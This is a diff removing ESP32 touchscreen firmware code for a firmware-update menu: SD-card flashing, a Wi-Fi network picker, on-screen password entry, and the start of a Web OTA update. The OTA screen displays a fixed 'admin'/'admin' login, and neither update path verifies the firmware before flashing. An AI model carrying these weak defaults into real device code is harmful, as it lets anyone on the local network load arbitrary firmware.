-static void fwResetNavCache() {
-  for (int i = 0; i < 5; ++i) {
-    s_fwNavCache[i][0] = '\0';
-  }
-}
-
-static int fwContentBottom() {
-  return featureHasTouchNavBar() ? (int)touchNavContentBottomY() : SCREEN_HEIGHT;
-}
-
-static void fwUpdateNavLabels(const char* left, const char* down, const char* center,
-                              const char* up, const char* right) {
-  if (!featureHasTouchNavBar()) {
-    return;
-  }
-  const char* src[5] = {left, down, center, up, right};
-  bool same = true;
-  for (int i = 0; i < 5; ++i) {
-    const char* s = (src[i] && src[i][0]) ? src[i] : "";
-    if (strcmp(s_fwNavCache[i], s) != 0) {
-      same = false;
-      break;
-    }
-  }
-  if (same) {
-    return;
-  }
-  for (int i = 0; i < 5; ++i) {
-    const char* s = (src[i] && src[i][0]) ? src[i] : "";
-    strncpy(s_fwNavCache[i], s, sizeof(s_fwNavCache[i]) - 1);
-    s_fwNavCache[i][sizeof(s_fwNavCache[i]) - 1] = '\0';
-  }
-  setTouchNavLabels(left, down, center, up, right);
-  redrawTouchButtonBar();
-}
-
-void runUI();
-
-static void fwEnsureToolbar() {
-  if (!uiDrawn) {
-    runUI();
-  }
-  if (featureHasTouchNavBar()) {
-    maintainTouchNavBar();
-  }
-}
-
-static void fwRestoreNavChrome() {
-  if (!featureHasTouchNavBar()) {
-    return;
-  }
-  invalidateTouchButtonCue();
-  maintainTouchNavBar();
-}
-
-static void fwClearBody(uint16_t color = TFT_BLACK) {
-  const int bottom = fwContentBottom();
-  if (bottom > 37) {
-    tft.fillRect(0, 37, 240, bottom - 37, color);
-  }
-  fwRestoreNavChrome();
-}
-
-static bool fwTouchInFooter(int x, int y, uint8_t index);
-static bool fwTouchFooterLabel(int x, int y, const char* label);
-
-static bool fwActionPressed(const char* label, int x = 0, int y = 0, bool touchValid = false) {
-  if (!label || !label[0]) {
-    return false;
-  }
-  if (featureHasTouchNavBar()) {
-    if (strcmp(label, "Back") == 0 || strcmp(label, "Exit") == 0 || strcmp(label, "Cancel") == 0) {
-      return isTouchNavButtonPressedEdge(BTN_LEFT);
-    }
-    if (strcmp(label, "Start") == 0 || strcmp(label, "OK") == 0 || strcmp(label, "Rescan") == 0) {
-      return isTouchNavButtonPressedEdge(BTN_SELECT);
-    }
-    if (strcmp(label, "Prev") == 0) {
-      return isTouchNavButtonPressedEdge(BTN_UP);
-    }
-    if (strcmp(label, "Next") == 0) {
-      return isTouchNavButtonPressedEdge(BTN_RIGHT);
-    }
-    return false;
-  }
-  return touchValid && fwTouchFooterLabel(x, y, label);
-}
-
-static void fwApplyTabNavLabels(const char* leftButton, const char* prevButton,
-                                 const char* nextButton) {
-  const char* left = nullptr;
-  const char* center = nullptr;
-  const char* up = nullptr;
-  const char* right = nullptr;
-  auto assign = [&](const char* btn) {
-    if (!btn || !btn[0]) {
-      return;
-    }
-    if (strcmp(btn, "Back") == 0 || strcmp(btn, "Exit") == 0 || strcmp(btn, "Cancel") == 0) {
-      left = btn;
-    } else if (strcmp(btn, "Start") == 0 || strcmp(btn, "OK") == 0 || strcmp(btn, "Rescan") == 0) {
-      center = btn;
-    } else if (strcmp(btn, "Prev") == 0) {
-      up = btn;
-    } else if (strcmp(btn, "Next") == 0) {
-      right = btn;
-    }
-  };
-  assign(leftButton);
-  assign(prevButton);
-  assign(nextButton);
-  fwUpdateNavLabels(left, nullptr, center, up, right);
-}
-
-static void fwDrawFooterButtons() {
-  for (uint8_t i = 0; i < s_fwFooterCount; ++i) {
-    FeatureUI::drawButton(s_fwFooter[i]);
-  }
-}
-
-static bool fwTouchInFooter(int x, int y, uint8_t index) {
-  if (index >= s_fwFooterCount) return false;
-  const auto& b = s_fwFooter[index];
-  return x >= b.x && x <= (b.x + b.w) && y >= b.y && y <= (b.y + b.h);
-}
-
-static bool fwTouchFooterLabel(int x, int y, const char* label) {
-  if (!label || !label[0]) return false;
-  for (uint8_t i = 0; i < s_fwFooterCount; ++i) {
-    if (s_fwFooter[i].label && strcmp(s_fwFooter[i].label, label) == 0) {
-      return fwTouchInFooter(x, y, i);
-    }
-  }
-  return false;
-}
-
-static void fwStoreFooter(const FeatureUI::Button* src, uint8_t count) {
-  s_fwFooterCount = count;
-  for (uint8_t i = 0; i < count && i < 4; ++i) {
-    s_fwFooter[i] = src[i];
-  }
-}
-
-void runUI() {
-#define SCREEN_WIDTH  240
-#define SCREENHEIGHT 320
-#define STATUS_BAR_Y_OFFSET 20
-#define STATUS_BAR_HEIGHT 16
-#define ICON_SIZE 16
-#define ICON_NUM 1
-
-  static int iconX[ICON_NUM] = {10};
-  static int iconY = STATUS_BAR_Y_OFFSET;
-
-  static const unsigned char* icons[ICON_NUM] = {
-    bitmap_icon_go_back
-  };
-
-  if (!uiDrawn) {
-    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
-    for (int i = 0; i < ICON_NUM; i++) {
-      if (icons[i] != NULL) {
-        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
-      }
-    }
-    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
-    uiDrawn = true;
-  }
-
-  static unsigned long lastAnimationTime = 0;
-  static int animationState = 0;
-  static int activeIcon = -1;
-  static unsigned long lastSpamTime = 0;
-
-  switch (animationState) {
-    case 0:
-      break;
-
-    case 1:
-      if (millis() - lastAnimationTime >= 150) {
-        tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
-        animationState = 2;
-        lastAnimationTime = millis();
-      }
-      break;
-
-    case 2:
-      if (millis() - lastAnimationTime >= 200) {
-        animationState = 3;
-        lastAnimationTime = millis();
-      }
-      break;
-
-    case 3:
-      switch (activeIcon) {
-         case 0:
-           feature_exit_requested = true;
-           animationState = 0;
-           activeIcon = -1;
-          break;
-      }
-      break;
-  }
-
-  static unsigned long lastTouchCheck = 0;
-  const unsigned long touchCheckInterval = 50;
-
-  if (millis() - lastTouchCheck >= touchCheckInterval) {
-    int x, y;
-    if (!featureHasTouchNavBar() && feature_active && readTouchXY(x, y)) {
-      if (y >= STATUS_BAR_Y_OFFSET && y <= STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT - 1) {
-        for (int i = 0; i < ICON_NUM; i++) {
-          if (x >= iconX[i] && x <= iconX[i] + ICON_SIZE - 1) {
-            if (icons[i] != NULL && animationState == 0) {
-              tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
-              animationState = 1;
-              activeIcon = i;
-              lastAnimationTime = millis();
-            }
-            break;
-          }
-        }
-      }
-    }
-    lastTouchCheck = millis();
-  }
-}
-
-void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled) {
-
-  FeatureUI::ButtonStyle style = highlight ? FeatureUI::ButtonStyle::Primary
-                                           : FeatureUI::ButtonStyle::Secondary;
-  FeatureUI::drawButtonRect(x, y, w, h, label, style, false, disabled);
-}
-
-void drawTabBar(const char* leftButton, bool leftDisabled, const char* prevButton, bool prevDisabled, const char* nextButton, bool nextDisabled) {
-  if (featureHasTouchNavBar()) {
-    (void)leftDisabled;
-    (void)prevDisabled;
-    (void)nextDisabled;
-    fwApplyTabNavLabels(leftButton, prevButton, nextButton);
-    return;
-  }
-  FeatureUI::drawFooterBg();
-  s_fwFooterCount = 0;
-
-  const bool hasLeft = leftButton && leftButton[0];
-  const bool hasMid = prevButton && prevButton[0];
-  const bool hasRight = nextButton && nextButton[0];
-
-  if (hasLeft && hasMid && hasRight) {
-    FeatureUI::Button btns[3];
-    FeatureUI::layoutFooter3(btns,
-      leftButton, FeatureUI::ButtonStyle::Secondary,
-      prevButton, FeatureUI::ButtonStyle::Secondary,
-      nextButton, FeatureUI::ButtonStyle::Secondary,
-      leftDisabled, prevDisabled, nextDisabled);
-    fwStoreFooter(btns, 3);
-  } else if (hasLeft && hasMid) {
-    FeatureUI::Button btns[2];
-    FeatureUI::layoutFooter2(btns,
-      leftButton, FeatureUI::ButtonStyle::Secondary,
-      prevButton, FeatureUI::ButtonStyle::Secondary,
-      leftDisabled, prevDisabled);
-    fwStoreFooter(btns, 2);
-  } else if (hasLeft && hasRight) {
-    FeatureUI::Button btns[2];
-    FeatureUI::layoutFooter2(btns,
-      leftButton, FeatureUI::ButtonStyle::Secondary,
-      nextButton, FeatureUI::ButtonStyle::Secondary,
-      leftDisabled, nextDisabled);
-    fwStoreFooter(btns, 2);
-  } else if (hasMid && hasRight) {
-    FeatureUI::Button btns[2];
-    FeatureUI::layoutFooter2(btns,
-      prevButton, FeatureUI::ButtonStyle::Secondary,
-      nextButton, FeatureUI::ButtonStyle::Secondary,
-      prevDisabled, nextDisabled);
-    fwStoreFooter(btns, 2);
-  } else if (hasRight) {
-    FeatureUI::layoutFooter1(s_fwFooter[0], nextButton, FeatureUI::ButtonStyle::Secondary, nextDisabled);
-    s_fwFooterCount = 1;
-  } else if (hasLeft) {
-    FeatureUI::layoutFooter1(s_fwFooter[0], leftButton, FeatureUI::ButtonStyle::Secondary, leftDisabled);
-    s_fwFooterCount = 1;
-  } else if (hasMid) {
-    FeatureUI::layoutFooter1(s_fwFooter[0], prevButton, FeatureUI::ButtonStyle::Secondary, prevDisabled);
-    s_fwFooterCount = 1;
-  }
-  fwDrawFooterButtons();
-}
-
-static void drawNetworkTabBar(bool prevDisabled, bool nextDisabled) {
-  if (featureHasTouchNavBar()) {
-    fwUpdateNavLabels("Back", nullptr, "Rescan", prevDisabled ? nullptr : "Prev",
-                      nextDisabled ? nullptr : "Next");
-    return;
-  }
-  FeatureUI::drawFooterBg();
-  FeatureUI::Button btns[4];
-  FeatureUI::layoutFooter4(btns,
-    "Back", FeatureUI::ButtonStyle::Secondary,
-    "Rescan", FeatureUI::ButtonStyle::Secondary,
-    "Prev", FeatureUI::ButtonStyle::Secondary,
-    "Next", FeatureUI::ButtonStyle::Secondary,
-    false, false, prevDisabled, nextDisabled);
-  fwStoreFooter(btns, 4);
-  fwDrawFooterButtons();
-}
-
-void drawMenu() {
-  tft.drawFastHLine(0, 19, 240, UI_LINE);
-  const int bodyBottom = fwContentBottom();
-  tft.fillRect(0, 37, 240, bodyBottom - 37, TFT_BLACK);
-
-  tft.setTextSize(1);
-
-  drawButton(BUTTON1_X, BUTTON1_Y, BUTTON_WIDTH, BUTTON_HEIGHT, "SD Update", false, false);
-  drawButton(BUTTON2_X, BUTTON2_Y, BUTTON_WIDTH, BUTTON_HEIGHT, "Web OTA", false, false);
-
-  if (featureHasTouchNavBar()) {
-    fwUpdateNavLabels("Exit", nullptr, nullptr, nullptr, nullptr);
-  } else {
-    FeatureUI::drawFooterBg();
-    FeatureUI::layoutFooter1(s_fwFooter[0], "Back", FeatureUI::ButtonStyle::Secondary, false);
-    s_fwFooterCount = 1;
-    FeatureUI::drawButton(s_fwFooter[0]);
-  }
-}
-
-bool checkButton(int16_t x, int16_t y, int buttonX, int buttonY, int buttonW, int buttonH) {
-  return x >= buttonX && x <= buttonX + buttonW - 1 &&
-         y >= buttonY && y <= buttonY + buttonH - 1;
-}
-
-// Returns true when Back was pressed via touch nav (edge already consumed).
-static bool waitForTouchXY(int& x, int& y) {
-  fwEnsureToolbar();
-  while (true) {
-    if (feature_exit_requested) {
-      x = y = 0;
-      return false;
-    }
-    if (featureHasTouchNavBar()) {
-      maintainTouchNavBar();
-      if (fwActionPressed("Back")) {
-        x = y = 0;
-        return true;
-      }
-    }
-    if (readTouchXY(x, y)) {
-      delay(80);
-      return false;
-    }
-    delay(10);
-  }
-}
-
-int yshift = 40;
-
-void performSDUpdate() {
-  updateStatusBar();
-  runUI();
-  uiDrawn = false;
-  fwClearBody(TFT_BLACK);
-  tft.setCursor(10, 10 + yshift);
-  tft.setTextColor(TFT_WHITE, TFT_BLACK);
-  tft.setTextSize(1);
-  tft.println("SD Update");
-  tft.setTextColor(TFT_GREEN, TFT_BLACK);
-  tft.setCursor(10, 30 + yshift);
-  tft.println("Insert SD card with");
-  tft.setCursor(10, 40 + yshift);
-  tft.println("firmware.bin in root");
-  tft.setCursor(10, 50 + yshift);
-  tft.println("Touch Start to update");
-
-  drawTabBar("Start", false, "", false, "Back", false);
-  fwRestoreNavChrome();
-
-  bool waitingForStart = true;
-
-  while (waitingForStart) {
-    if (feature_exit_requested) {
-      return;
-    }
-    if (featureHasTouchNavBar()) {
-      maintainTouchNavBar();
-    }
-    if (fwActionPressed("Back")) {
-      drawMenu();
-      return;
-    }
-    if (fwActionPressed("Start")) {
-      waitingForStart = false;
-      continue;
-    }
-    int x, y;
-    if (readTouchXY(x, y)) {
-      if (fwActionPressed("Back", x, y, true)) {
-        drawMenu();
-        return;
-      }
-      if (fwActionPressed("Start", x, y, true)) {
-        waitingForStart = false;
-      }
-      delay(50);
-    } else {
-      delay(10);
-    }
-  }
-
-  fwClearBody(TFT_BLACK);
-  tft.setCursor(10, 10 + yshift);
-  tft.setTextColor(TFT_WHITE, TFT_BLACK);
-  tft.setTextSize(1);
-  tft.println("Starting SD Update...");
-  drawTabBar("", false, "", false, "Back", false);
-  fwRestoreNavChrome();
-  fwEnsureToolbar();
-
-  bool proceed = true;
-  uint32_t lastInputMs = 0;
-  while (proceed) {
-    const uint32_t now = millis();
-    if (feature_exit_requested) {
-      return;
-    }
-    if ((uint32_t)(now - lastInputMs) >= 50u) {
-      lastInputMs = now;
-      if (featureHasTouchNavBar()) {
-        maintainTouchNavBar();
-      }
-      if (fwActionPressed("Back")) {
-        drawMenu();
-        return;
-      }
-      int x, y;
-      if (readTouchXY(x, y) && fwActionPressed("Back", x, y, true)) {
-        drawMenu();
-        return;
-      }
-    }
-
-    tft.setTextColor(TFT_WHITE, TFT_BLACK);
-    tft.setCursor(10, 30 + yshift);
-    tft.println("Initializing SD...");
-
-    bool ok = isSDCardAvailable();
-    if (!ok) {
-      tft.setTextColor(UI_WARN, TFT_BLACK);
-      tft.setCursor(10, 40 + yshift);
-      tft.println("X SD init failed!");
-      tft.setCursor(10, 50 + yshift);
-      tft.println("Touch to retry or Back");
-      drawTabBar("", false, "", false, "Back", false);
-      fwRestoreNavChrome();
-      int x, y;
-      if (waitForTouchXY(x, y)) {
-        drawMenu();
-        return;
-      }
-      tft.fillRect(0, 37, 240, fwContentBottom() - 37, TFT_BLACK);
-      tft.setCursor(10, 10 + yshift);
-      tft.setTextColor(TFT_WHITE, TFT_BLACK);
-      tft.println("Starting SD Update...");
-      drawTabBar("", false, "", false, "Back", false);
-      fwRestoreNavChrome();
-      continue;
-    }
-    tft.setTextColor(TFT_GREEN, TFT_BLACK);
-    tft.setCursor(10, 40 + yshift);
-    tft.println("SD card OK");
-
-    if (!SD.exists(FIRMWARE_FILE)) {
-      tft.setTextColor(UI_WARN, TFT_BLACK);
-      tft.setCursor(10, 30 + yshift);
-      tft.println("X Firmware not found!");
-      tft.setCursor(10, 40 + yshift);
-      tft.println("Touch to retry or Back");
-      drawTabBar("", false, "", false, "Back", false);
-      fwRestoreNavChrome();
-      int x, y;
-      if (waitForTouchXY(x, y)) {
-        drawMenu();
-        return;
-      }
-      tft.fillRect(0, 37, 240, fwContentBottom() - 37, TFT_BLACK);
-      tft.setCursor(10, 10 + yshift);
-      tft.setTextColor(TFT_WHITE, TFT_BLACK);
-      tft.println("Starting SD Update...");
-      drawTabBar("", false, "", false, "Back", false);
-      fwRestoreNavChrome();
-      continue;
-    }
-
-    File firmwareFile = SD.open(FIRMWARE_FILE, FILE_READ);
-    if (!firmwareFile) {
-      tft.setTextColor(UI_WARN, TFT_BLACK);
-      tft.setCursor(10, 30 + yshift);
-      tft.println("X File open failed!");
-      tft.setCursor(10, 40 + yshift);
-      tft.println("Touch to retry or Back");
-      drawTabBar("", false, "", false, "Back", false);
-      fwRestoreNavChrome();
-      int x, y;
-      if (waitForTouchXY(x, y)) {
-        drawMenu();
-        return;
-      }
-      tft.fillRect(0, 37, 240, fwContentBottom() - 37, TFT_BLACK);
-      tft.setCursor(10, 10 + yshift);
-      tft.setTextColor(TFT_WHITE, TFT_BLACK);
-      tft.println("Starting SD Update...");
-      drawTabBar("", false, "", false, "Back", false);
-      fwRestoreNavChrome();
-      continue;
-    }
-
-    size_t fileSize = firmwareFile.size();
-    tft.setTextColor(TFT_WHITE, TFT_BLACK);
-    tft.setCursor(10, 50 + yshift);
-    tft.printf("Size: %u bytes\n", fileSize);
-    if (!Update.begin(fileSize)) {
-      tft.setTextColor(UI_WARN, TFT_BLACK);
-      tft.setCursor(10, 30 + yshift);
-      tft.println("X Update init failed!");
-      tft.setCursor(10, 40 + yshift);
-      tft.println("Touch to retry or Back");
-      drawTabBar("", false, "", false, "Back", false);
-      fwRestoreNavChrome();
-      int x, y;
-      if (waitForTouchXY(x, y)) {
-        drawMenu();
-        return;
-      }
-      tft.fillRect(0, 37, 240, fwContentBottom() - 37, TFT_BLACK);
-      tft.setCursor(10, 10 + yshift);
-      tft.setTextColor(TFT_WHITE, TFT_BLACK);
-      tft.println("Starting SD Update...");
-      drawTabBar("", false, "", false, "Back", false);
-      fwRestoreNavChrome();
-      continue;
-    }
-
-    tft.setTextColor(TFT_WHITE, TFT_BLACK);
-    tft.setCursor(10, 60 + yshift);
-    tft.println("Updating...");
-    size_t written = Update.writeStream(firmwareFile);
-    if (written != fileSize) {
-      tft.setTextColor(UI_WARN, TFT_BLACK);
-      tft.setCursor(10, 30 + yshift);
-      tft.println("X Update failed!");
-      tft.setCursor(10, 40 + yshift);
-      tft.println("Touch to retry or Back");
-      drawTabBar("", false, "", false, "Back", false);
-      fwRestoreNavChrome();
-      int x, y;
-      if (waitForTouchXY(x, y)) {
-        drawMenu();
-        return;
-      }
-      tft.fillRect(0, 37, 240, fwContentBottom() - 37, TFT_BLACK);
-      tft.setCursor(10, 10 + yshift);
-      tft.setTextColor(TFT_WHITE, TFT_BLACK);
-      tft.println("Starting SD Update...");
-      drawTabBar("", false, "", false, "Back", false);
-      fwRestoreNavChrome();
-      continue;
-    }
-
-    tft.setTextColor(TFT_GREEN, TFT_BLACK);
-    tft.setCursor(10, 20 + yshift);
-    tft.println("Update OK!");
-    if (Update.end(true)) {
-      tft.setTextColor(TFT_WHITE, TFT_BLACK);
-      tft.setCursor(10, 30 + yshift);
-      tft.println("Rebooting...");
-      delay(2000);
-      ESP.restart();
-    } else {
-      tft.setTextColor(UI_WARN, TFT_BLACK);
-      tft.setCursor(10, 30 + yshift);
-      tft.println("X Finalize failed!");
-      tft.setCursor(10, 40 + yshift);
-      tft.println("Touch to retry or Back");
-      drawTabBar("", false, "", false, "Back", false);
-      fwRestoreNavChrome();
-      int x, y;
-      if (waitForTouchXY(x, y)) {
-        drawMenu();
-        return;
-      }
-      tft.fillRect(0, 37, 240, fwContentBottom() - 37, TFT_BLACK);
-      tft.setCursor(10, 10 + yshift);
-      tft.setTextColor(TFT_WHITE, TFT_BLACK);
-      tft.println("Starting SD Update...");
-      drawTabBar("", false, "", false, "Back", false);
-      fwRestoreNavChrome();
-      continue;
-    }
-    proceed = false;
-  }
-}
-
-bool selectWiFiNetwork() {
-  uiDrawn = false;
-  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
-  tft.drawFastHLine(0, 19, 240, UI_LINE);
-  tft.setCursor(10, 50);
-  tft.setTextColor(GREEN);
-  tft.setTextSize(1);
-  tft.println("Scanning.");
-  WiFi.mode(WIFI_STA);
-  WiFi.disconnect();
-  delay(100);
-
-  int numNetworks = WiFi.scanNetworks();
-  if (numNetworks <= 0) {
-    tft.fillRect(0, 37, 240, 320, TFT_BLACK);
-    tft.drawFastHLine(0, 19, 240, UI_LINE);
-    tft.setTextColor(GREEN);
-    tft.setCursor(10, 50);
-    tft.println("No networks found.");
-    tft.setCursor(10, 60);
-    tft.println("Touch to retry");
-    drawTabBar("Back", false, "Rescan", false, "", true);
-    fwEnsureToolbar();
-    while (true) {
-      if (featureHasTouchNavBar()) {
-        maintainTouchNavBar();
-      }
-      if (fwActionPressed("Back")) {
-        return false;
-      }
-      if (fwActionPressed("Rescan")) {
-        return selectWiFiNetwork();
-      }
-      int x, y;
-      if (readTouchXY(x, y)) {
-        delay(200);
-        if (fwActionPressed("Back", x, y, true)) {
-          return false;
-        }
-        if (fwActionPressed("Rescan", x, y, true)) {
-          return selectWiFiNetwork();
-        }
-        break;
-      }
-      delay(10);
-    }
-    return false;
-  }
-
-  NetworkInfo* networks = new NetworkInfo[numNetworks];
-  for (int i = 0; i < numNetworks; i++) {
-    strncpy(networks[i].ssid, WiFi.SSID(i).c_str(), 31);
-    networks[i].ssid[31] = '\0';
-    networks[i].rssi = WiFi.RSSI(i);
-    networks[i].channel = WiFi.channel(i);
-    networks[i].authmode = WiFi.encryptionType(i);
-  }
-
-  int startIndex = 0;
-  int selectedIndex = -1;
-  bool selected = false;
-  int lastPaintedStart = -1;
-  int lastPaintedSel = -2;
-  while (!selected) {
-    if (featureHasTouchNavBar()) {
-      maintainTouchNavBar();
-    }
-    if (feature_exit_requested) {
-      delete[] networks;
-      wifiPassword[0] = '\0';
-      return false;
-    }
-    if (fwActionPressed("Back")) {
-      delete[] networks;
-      wifiPassword[0] = '\0';
-      return false;
-    }
-    if (fwActionPressed("Rescan")) {
-      delete[] networks;
-      return selectWiFiNetwork();
-    }
-    if (fwActionPressed("Prev") && startIndex > 0) {
-      startIndex -= FW_NETWORKS_PER_PAGE;
-      selectedIndex = -1;
-    }
-    if (fwActionPressed("Next") && startIndex + FW_NETWORKS_PER_PAGE < numNetworks) {
-      startIndex += FW_NETWORKS_PER_PAGE;
-      selectedIndex = -1;
-    }
-    if (startIndex != lastPaintedStart || selectedIndex != lastPaintedSel) {
-      drawNetworkList(startIndex, numNetworks, networks, selectedIndex);
-      lastPaintedStart = startIndex;
-      lastPaintedSel = selectedIndex;
-    }
-    int x, y;
-    if (!readTouchXY(x, y)) {
-      delay(10);
-      continue;
-    }
-    delay(200);
-
-    int y_pos = NETWORK_Y_START;
-    int end_index = min(startIndex + FW_NETWORKS_PER_PAGE, numNetworks);
-    for (int i = startIndex; i < end_index && y_pos < 300; i++) {
-      if (x >= 10 && x < SCREEN_WIDTH - 10 && y >= y_pos && y < y_pos + NETWORK_ROW_HEIGHT) {
-        char buf[64];
-        char ssid[16];
-        strncpy(ssid, networks[i].ssid, 11);
-        ssid[11] = '\0';
-        if (strlen(networks[i].ssid) > 11) strcat(ssid, "...");
-        const char* enc = networks[i].authmode == WIFI_AUTH_OPEN ? "OPEN" : "WPA2";
-        snprintf(buf, sizeof(buf), "%02d: %-15s %3d dBm Ch%2d %s", i + 1, ssid, networks[i].rssi, networks[i].channel, enc);
-        tft.setTextColor(ORANGE, TFT_BLACK);
-        tft.setTextSize(1);
-        tft.setCursor(10, y_pos);
-        tft.println(buf);
-        delay(100);
-        tft.setTextColor(i == selectedIndex ? ORANGE : (networks[i].authmode == WIFI_AUTH_OPEN ? ORANGE : TFT_WHITE), TFT_BLACK);
-        tft.setCursor(10, y_pos);
-        tft.println(buf);
-        selectedIndex = i;
-        strncpy(selectedSSID, networks[i].ssid, 31);
-        selectedSSID[31] = '\0';
-        selected = true;
-        break;
-      }
-      y_pos += NETWORK_ROW_HEIGHT;
-    }
-
-    if (fwActionPressed("Back", x, y, true)) {
-      delete[] networks;
-      wifiPassword[0] = '\0';
-      return false;
-    }
-    if (fwActionPressed("Rescan", x, y, true)) {
-      delete[] networks;
-      return selectWiFiNetwork();
-    }
-    if (fwActionPressed("Prev", x, y, true) && startIndex > 0) {
-      startIndex -= FW_NETWORKS_PER_PAGE;
-      selectedIndex = -1;
-    }
-    if (fwActionPressed("Next", x, y, true) && startIndex + FW_NETWORKS_PER_PAGE < numNetworks) {
-      startIndex += FW_NETWORKS_PER_PAGE;
-      selectedIndex = -1;
-    }
-  }
-
-  delete[] networks;
-  return true;
-}
-
-void drawNetworkList(int startIndex, int numNetworks, NetworkInfo* networks, int selectedIndex) {
-  tft.drawFastHLine(0, 19, 240, UI_LINE);
-  const int bodyBottom = fwContentBottom();
-  tft.fillRect(0, 37, 240, bodyBottom - 37, TFT_BLACK);
-  tft.setTextSize(1);
-
-  if (numNetworks == 0) {
-    tft.setTextColor(GREEN);
-    tft.setCursor(10, 50);
-    tft.println("No networks found.");
-  } else {
-    int y = 50;
-    tft.setTextColor(GREEN);
-    tft.setCursor(10, y);
-    tft.println("Networks:");
-    y += 20;
-
-    int start_index = startIndex;
-    int end_index = min(start_index + FW_NETWORKS_PER_PAGE, numNetworks);
-
-    for (int i = start_index; i < end_index && y < 300; i++) {
-      char buf[64];
-      char ssid[16];
-      strncpy(ssid, networks[i].ssid, 11);
-      ssid[11] = '\0';
-      if (strlen(networks[i].ssid) > 11) strcat(ssid, "...");
-      const char* enc = networks[i].authmode == WIFI_AUTH_OPEN ? "OPEN" : "WPA2";
-      snprintf(buf, sizeof(buf), "%02d: %-15s %3d dBm Ch%2d %s", i + 1, ssid, networks[i].rssi, networks[i].channel, enc);
-      tft.setCursor(10, y);
-      tft.setTextColor(i == selectedIndex ? ORANGE : (networks[i].authmode == WIFI_AUTH_OPEN ? ORANGE : TFT_WHITE));
-      tft.println(buf);
-      y += NETWORK_ROW_HEIGHT;
-    }
-
-    char page_buf[20];
-    snprintf(page_buf, sizeof(page_buf), "Page %d/%d", start_index / FW_NETWORKS_PER_PAGE + 1, (numNetworks + FW_NETWORKS_PER_PAGE - 1) / FW_NETWORKS_PER_PAGE);
-    tft.setCursor(180, 50);
-    tft.setTextColor(GREEN);
-    tft.println(page_buf);
-  }
-
-  bool prevDisabled = startIndex == 0;
-  bool nextDisabled = (startIndex + FW_NETWORKS_PER_PAGE) >= numNetworks;
-  drawNetworkTabBar(prevDisabled, nextDisabled);
-  fwEnsureToolbar();
-}
-
-bool enterWiFiPassword() {
-  wifiPassword[0] = '\0';
-
-  OnScreenKeyboardConfig cfg;
-  cfg.titleLine1      = "[!] Enter the Wi-Fi password for the";
-  cfg.titleLine2      = "selected network. ^ caps, # sym";
-  osKeyboardUseStandardLayout(cfg);
-  cfg.maxLen          = PASSWORD_MAX_LENGTH;
-  cfg.shuffleNames    = nullptr;
-  cfg.shuffleCount    = 0;
-  cfg.buttonsY        = 195;
-  cfg.backLabel       = "Back";
-  cfg.middleLabel     = "Del";
-  cfg.okLabel         = "OK";
-  cfg.enableShuffle   = false;
-  cfg.requireNonEmpty = true;
-  cfg.emptyErrorMsg   = "Password cannot be empty!";
-
-  OnScreenKeyboardResult r = showOnScreenKeyboard(cfg, "");
-
-  if (!r.accepted) {
-
-    wifiPassword[0] = '\0';
-    return false;
-  }
-
-  size_t n = min((size_t)PASSWORD_MAX_LENGTH, (size_t)r.text.length());
-  for (size_t i = 0; i < n; ++i) {
-    wifiPassword[i] = r.text[i];
-  }
-  wifiPassword[n] = '\0';
-
-  return true;
-}
-
-void performWebOTAUpdate() {
-  uiDrawn = false;
-  static size_t totalUploaded = 0;
-  bool inUpdate = false;
-
-  if (!selectWiFiNetwork()) {
-    drawMenu();
-    return;
-  }
-
-  if (!enterWiFiPassword()) {
-    drawMenu();
-    return;
-  }
-
-  updateStatusBar();
-  runUI();
-  const int bodyBottom = fwContentBottom();
-  tft.fillRect(0, 37, 240, bodyBottom - 37, TFT_BLACK);
-  tft.setCursor(10, 10 + yshift);
-  tft.setTextColor(TFT_WHITE, TFT_BLACK);
-  tft.setTextSize(1);
-  tft.println("Starting Web OTA...");
-  drawTabBar("", false, "", false, "Back", false);
-
-  tft.setTextColor(TFT_WHITE, TFT_BLACK);
-  tft.setCursor(10, 30 + yshift);
-  tft.println("Connecting Wi-Fi");
-  fwEnsureToolbar();
-  WiFi.begin(selectedSSID, wifiPassword);
-  int attempts = 0;
-  uint32_t lastConnectPollMs = 0;
-  while (WiFi.status() != WL_CONNECTED && attempts < 20) {
-    const uint32_t now = millis();
-    if ((uint32_t)(now - lastConnectPollMs) >= 50u) {
-      lastConnectPollMs = now;
-      if (featureHasTouchNavBar()) {
-        maintainTouchNavBar();
-      }
-      if (feature_exit_requested) {
-        WiFi.disconnect();
-        return;
-      }
-      if (fwActionPressed("Back")) {
-        WiFi.disconnect();
-        drawMenu();
-        return;
-      }
-      int x, y;
-      if (readTouchXY(x, y) && fwActionPressed("Back", x, y, true)) {
-        WiFi.disconnect();
-        drawMenu();
-        return;
-      }
-    }
-    delay(500);
-    attempts++;
-  }
-  if (WiFi.status() != WL_CONNECTED) {
-    tft.setTextColor(UI_WARN, TFT_BLACK);
-    tft.setCursor(10, 40 + yshift);
-    tft.println("X Wi-Fi failed!");
-    tft.setCursor(10, 50 + yshift);
-    tft.println("Touch to retry or Back");
-    drawTabBar("", false, "", false, "Back", false);
-    fwRestoreNavChrome();
-    int x, y;
-    if (waitForTouchXY(x, y)) {
-      WiFi.disconnect();
-      drawMenu();
-      return;
-    }
-    performWebOTAUpdate();
-    return;
-  }
-  tft.setTextColor(TFT_GREEN, TFT_BLACK);
-  tft.setCursor(10, 40 + yshift);
-  tft.println("Wi-Fi OK");
-  tft.setTextColor(TFT_WHITE, TFT_BLACK);
-  tft.setCursor(10, 50 + yshift);
-  tft.print("IP: ");
-  tft.println(WiFi.localIP());
-  tft.setCursor(10, 70 + yshift);
-  tft.println("URL: http://esp32.local");
-  tft.setCursor(10, 80 + yshift);
-  tft.println("User: admin");
-  tft.setCursor(10, 90 + yshift);
-  tft.println("Pass: admin");
-
-  if (!MDNS.begin(host)) {
-    tft.setTextColor(UI_WARN, TFT_BLACK);
-    tft.setCursor(10, 40 + yshift);
-    tft.println("X mDNS failed!");
-    tft.setCursor(10, 50 + yshift);
-    tft.println("Touch to retry or Back");
